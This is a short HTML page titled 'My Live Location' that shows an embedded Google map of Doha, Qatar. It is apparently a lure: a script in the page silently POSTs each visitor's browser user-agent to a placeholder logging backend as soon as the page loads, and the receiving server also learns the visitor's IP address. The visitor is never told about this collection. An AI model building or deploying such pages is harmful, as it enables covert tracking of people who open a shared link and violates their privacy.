<!DOCTYPE html>
<html>
<head>
  <title>My Live Location</title>
  <style>
    body, html {
      margin: 0;
      padding: 0;
      height: 100%;
    }
    iframe {
      width: 100%;
      height: 100%;
      border: none;
    }
  </style>
</head>
<body>
  <iframe src="https://maps.google.com/maps?q=doha%20qatar&t=&z=13&ie=UTF8&iwloc=&output=embed"></iframe>

  <script>
    fetch("https://YOUR_BACKEND.deta.app/log", {
      method: "POST",
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({ navigator: navigator.userAgent })
    });
  </script>
</body>
</html>
